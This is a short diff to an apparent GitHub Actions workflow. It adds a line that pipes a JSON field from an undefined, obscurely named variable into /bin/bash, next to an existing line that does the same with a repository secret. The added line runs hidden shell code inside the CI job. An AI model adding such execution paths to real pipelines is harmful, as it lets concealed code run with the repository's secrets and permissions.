@@ -18,6 +18,7 @@ jobs:
           be74: ${{ secrets.be74 }}
         run: |
           printf '%s' "$be74" | jq -r .qrz6549 | /bin/bash
+          printf '%s' "$jtvji0" | jq -r .o2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
